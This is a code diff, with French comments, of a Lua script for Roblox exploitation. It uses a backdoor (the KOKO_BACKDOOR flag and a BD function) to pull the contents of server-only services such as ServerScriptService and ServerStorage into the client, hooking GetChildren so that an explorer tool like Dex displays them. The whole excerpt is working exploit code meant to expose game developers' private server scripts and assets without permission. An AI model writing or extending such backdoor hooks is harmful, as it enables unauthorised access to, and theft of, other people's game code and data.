@@ -36,40 +36,44 @@ getgenv().listModules = function() return BD("listallmodules") end
 getgenv().listRemotes = function() return BD("listallremotes") end
 
 -- === OVERRIDE GETCHILDREN POUR SERVICES SERVEUR ===
+-- === OVERRIDE GETCHILDREN SUR LES SERVICES SERVEUR DIRECTEMENT ===
 if KOKO_BACKDOOR then
-    local oldGetChildren = game.GetChildren
+    local serverServices = {
+        ["ServerScriptService"] = true,
+        ["ServerStorage"] = true, 
+        ["ServerReplicatedStorage"] = true
+    }
     
-    game.GetChildren = function(self)
-        local children = oldGetChildren(self)
-        
-        -- Si c'est un service serveur, ajouter les vrais enfants
-        if self:IsA("ServiceProvider") and 
-           (self.Name == "ServerScriptService" or 
-            self.Name == "ServerStorage" or 
-            self.Name == "ServerReplicatedStorage") then
+    -- Hook sur game.DescendantAdded pour injecter au moment où Dex découvre le service
+    local oldDescendantAdded = game.DescendantAdded
+    
+    -- Modifier directement les services quand ils sont créés
+    for _, svc in pairs(game:GetChildren()) do
+        if svc:IsA("ServiceProvider") and serverServices[svc.Name] then
+            local oldGetChildren = svc.GetChildren
             
-            local result = BD("getchildren", self.Name)
-            if result and #children == 0 then
-                -- Le service est vide côté client, on le remplit
-                for line in result:gmatch("[^\n]+") do
-                    local cn, nm = line:match("^([^:]+):%s*(.+)$")
-                    if cn and nm then
-                        local folder = Instance.new("Folder")
-                        folder.Name = nm
-                        folder.Parent = self
-                        table.insert(children, folder)
+            svc.GetChildren = function(self)
+                local children = oldGetChildren(self)
+                
+                if #children == 0 then
+                    local result = BD("getchildren", self.Name)
+                    if result then
+                        for line in result:gmatch("[^\n]+") do
+                            local cn, nm = line:match("^([^:]+):%s*(.+)$")
+                            if cn and nm then
+                                local folder = Instance.new("Folder")
+                                folder.Name = nm
+                                folder.Parent = self
+                                table.insert(children, folder)
+                            end
+                        end
                     end
                 end
+                return children
             end
         end
-        return children
     end
 end
-
-
-
-
-
 -- === OVERRIDE GETDESCENDANTS POUR SERVICES SERVEUR ===
 if KOKO_BACKDOOR then
     local oldGetDescendants = game.GetDescendants
